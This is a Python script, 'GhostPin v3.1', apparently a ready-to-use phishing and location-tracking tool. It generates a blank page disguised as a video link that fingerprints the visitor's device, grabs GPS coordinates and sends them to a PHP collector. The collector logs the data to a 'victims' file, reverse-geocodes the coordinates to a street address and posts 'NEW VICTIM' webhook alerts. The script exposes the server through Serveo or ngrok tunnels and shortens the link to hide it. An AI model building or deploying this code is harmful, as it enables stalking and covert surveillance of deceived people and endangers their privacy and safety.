#!/usr/bin/env python3
# GhostPin v3.1 - Invisible GPS Tracker
import os
import sys
import json
import time
import subprocess
from datetime import datetime

def banner():
    print("""
\033[1;31m
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║  ███╗███████║██║   ██║███████╗   ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
\033[0m
\033[1;35m     ██████╗ ██╗███╗   ██╗
    ██╔══██╗██║████╗  ██║
    ██████╔╝██║██╔██╗ ██║
    ██╔═══╝ ██║██║╚██╗██║
    ██║     ██║██║ ╚████║
    ╚═╝     ╚═╝╚═╝  ╚═══╝
\033[0m
\033[1;32m    INVISIBLE GPS TRACKER v3.1
\033[0m
    """)

def main():
    banner()
    
    print("\033[1;36m[?] Paste the real video URL:\033[0m")
    video_url = input("    > ").strip()
    
    if not video_url.startswith("http"):
        print("\033[1;31m[!] Invalid URL\033[0m")
        sys.exit(1)
    
    print("\033[1;36m[?] Screen color (black/white) [black]:\033[0m")
    color = input("    > ").strip().lower()
    if color not in ['black', 'white']:
        color = 'black'
    
    print("\033[1;36m[?] Delay before redirect (1-5 seconds) [2]:\033[0m")
    delay = input("    > ").strip()
    if not delay.isdigit():
        delay = 2
    else:
        delay = int(delay)
        if delay < 1: delay = 1
        if delay > 5: delay = 5
    
    # Build the invisible template
    bg = "#000" if color == 'black' else "#FFF"
    
    template = f'''<!DOCTYPE html>
<html style="background:{bg};width:100%;height:100%;margin:0;padding:0;">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title></title>
</head>
<body style="background:{bg};margin:0;padding:0;width:100%;height:100%;">
</body>
<script>
var REDIRECT_URL = "{video_url}";
var DELAY = {delay * 1000};
var data = {{}};

// Collect device fingerprint
data.screen = screen.width + "x" + screen.height;
data.colorDepth = screen.colorDepth;
data.pixelRatio = window.devicePixelRatio;
data.platform = navigator.platform;
data.language = navigator.language;
data.languages = navigator.languages;
data.userAgent = navigator.userAgent;
data.hardwareConcurrency = navigator.hardwareConcurrency || "?";
data.deviceMemory = navigator.deviceMemory || "?";
data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
data.timestamp = new Date().toISOString();
data.referrer = document.referrer || "direct";

// Get battery info
if (navigator.getBattery) {{
    navigator.getBattery().then(function(b) {{
        data.battery = Math.round(b.level * 100) + "%";
        data.charging = b.charging;
    }});
}}

// Try to get GPU info
try {{
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {{
        var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {{
            data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }}
    }}
}} catch(e) {{}}

// GPS Silent Grab
function sendData() {{
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/collect", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
}}

if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
        function(pos) {{
            data.gps_lat = pos.coords.latitude;
            data.gps_lon = pos.coords.longitude;
            data.gps_accuracy = pos.coords.accuracy;
            data.gps_altitude = pos.coords.altitude || 0;
            data.gps_speed = pos.coords.speed || 0;
            data.gps_heading = pos.coords.heading || 0;
            data.gps_timestamp = new Date(pos.timestamp).toISOString();
            sendData();
        }},
        function(err) {{
            data.gps_error = err.message;
            sendData();
        }},
        {{enableHighAccuracy: true, timeout: 5000, maximumAge: 0}}
    );
}} else {{
    data.gps_error = "Geolocation not supported";
    sendData();
}}

// Redirect after delay
setTimeout(function() {{
    window.location.href = REDIRECT_URL;
}}, DELAY);
</script>
</html>'''
    
    with open("templates/invisible.html", "w") as f:
        f.write(template)
    
    print(f"\033[1;32m[+] Template generated\033[0m")
    print(f"\033[1;36m[+] Starting servers...\033[0m")
    
    # Start PHP server
    os.system("mkdir -p db reports")
    
    # Create PHP collector
    collector = '''<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $raw = file_get_contents("php://input");
    $data = json_decode($raw, true);
    
    if ($data) {
        // Add server-side info
        $data["server_time"] = date("Y-m-d H:i:s");
        $data["client_ip"] = $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["HTTP_CLIENT_IP"] ?? $_SERVER["REMOTE_ADDR"] ?? "unknown";
        $data["user_agent_full"] = $_SERVER["HTTP_USER_AGENT"] ?? "";
        $data["accept_language"] = $_SERVER["HTTP_ACCEPT_LANGUAGE"] ?? "";
        
        // Get IP geolocation
        $ip = $data["client_ip"];
        if ($ip && $ip != "127.0.0.1" && $ip != "::1") {
            $geo = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as");
            if ($geo) {
                $geo_data = json_decode($geo, true);
                if ($geo_data && isset($geo_data["country"])) {
                    $data["ip_geo"] = $geo_data;
                }
            }
        }
        
        // Get address from GPS coordinates
        if (isset($data["gps_lat"]) && isset($data["gps_lon"]) && $data["gps_lat"] != 0) {
            $lat = $data["gps_lat"];
            $lon = $data["gps_lon"];
            $nominatim = @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lon&zoom=18&addressdetails=1&accept-language=ar,en");
            if ($nominatim) {
                $addr = json_decode($nominatim, true);
                if (isset($addr["display_name"])) {
                    $data["address"] = $addr["display_name"];
                    $data["address_details"] = $addr["address"] ?? [];
                }
            }
        }
        
        // Save to file
        $log_file = "db/victims.log";
        file_put_contents($log_file, json_encode($data, JSON_UNESCAPED_UNICODE) . "\\n", FILE_APPEND);
        
        // Save individual report
        $report_file = "reports/victim_" . date("Ymd_His") . "_" . substr(md5($raw), 0, 8) . ".json";
        file_put_contents($report_file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        
        // Send webhook notification if configured
        $config = @json_decode(file_get_contents("../config.json"), true);
        if ($config && isset($config["webhook_url"]) && $config["webhook_url"]) {
            $msg = "🆕 NEW VICTIM\\n\\n";
            if (isset($data["gps_lat"])) {
                $msg .= " GPS: " . $data["gps_lat"] . ", " . $data["gps_lon"] . "\\n";
                $msg .= " Accuracy: " . ($data["gps_accuracy"] ?? "?") . "m\\n";
                if (isset($data["address"])) {
                    $msg .= " " . $data["address"] . "\\n";
                }
            }
            $msg .= " " . ($data["platform"] ?? "?") . "\\n";
            $msg .= " IP: " . ($data["client_ip"] ?? "?") . "\\n";
            $msg .= " " . ($data["server_time"] ?? "");
            
            @file_get_contents($config["webhook_url"] . "?format=json&text=" . urlencode($msg));
        }
        
        echo json_encode(["status" => "ok"]);
    }
} else {
    // Serve the invisible page
    readfile("templates/invisible.html");
}
?>
'''
    
    with open("collector.php", "w") as f:
        f.write(collector)
    
    # Start PHP server in background
    print("\033[1;33m[*] PHP Server starting on port 8080...\033[0m")
    subprocess.Popen(["php", "-S", "0.0.0.0:8080", "-t", "."], 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    # Try tunnel
    print("\033[1;36m[?] Tunnel method:\033[0m")
    print("    [1] Serveo (recommended)")
    print("    [2] Localhost only")
    print("    [3] Ngrok")
    choice = input("    > ").strip()
    
    tunnel_url = None
    
    if choice == "1":
        print("\033[1;33m[*] Connecting to Serveo...\033[0m")
        serveo_cmd = 'ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net 2>&1'
        proc = subprocess.Popen(serveo_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        # Parse the URL
        for _ in range(5):
            line = proc.stdout.readline().decode().strip()
            if "Forwarding" in line or "serveo.net" in line:
                tunnel_url = line.split(" ")[-1]
                break
            time.sleep(1)
        if not tunnel_url:
            print("\033[1;31m[!] Could not get Serveo URL. Check internet.\033[0m")
            print("\033[1;33m[*] Using localhost: http://127.0.0.1:8080/collector.php\033[0m")
    
    elif choice == "3":
        print("\033[1;33m[*] Make sure ngrok is installed and authenticated\033[0m")
        ngrok_cmd = "ngrok http 8080 2>&1"
        proc = subprocess.Popen(ngrok_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(2)
        print("\033[1;33m[*] Getting ngrok URL...\033[0m")
    
    # Generate final URL
    if tunnel_url:
        final_url = tunnel_url + "/collector.php"
    else:
        final_url = "http://127.0.0.1:8080/collector.php"
    
    print(f"\n\033[1;32m{'='*60}\033[0m")
    print(f"\033[1;37m[+] YOUR TRACKING LINK:\033[0m")
    print(f"\033[1;33m    {final_url}\033[0m")
    print(f"\033[1;32m{'='*60}\033[0m")
    
    # Try to shorten
    print("\n\033[1;36m[?] Shorten URL? (y/n):\033[0m")
    if input("    > ").strip().lower() == 'y':
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            short_url = s.tinyurl.short(final_url)
            print(f"\n\033[1;32m[+] Shortened URL:\033[0m")
            print(f"\033[1;33m    {short_url}\033[0m")
        except:
            print("\033[1;31m[!] Could not shorten. Use the long URL above.\033[0m")
    
    print(f"\n\033[1;35m[*] Waiting for victims... Press Ctrl+C to stop.\033[0m")
    print(f"\033[1;35m[*] Data saved in: db/victims.log\033[0m")
    print(f"\033[1;35m[*] Reports saved in: reports/\033[0m\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Shutting down...\033[0m")
        os.system("pkill -f 'php -S'")
        sys.exit(0)

if __name__ == "__main__":
    main()
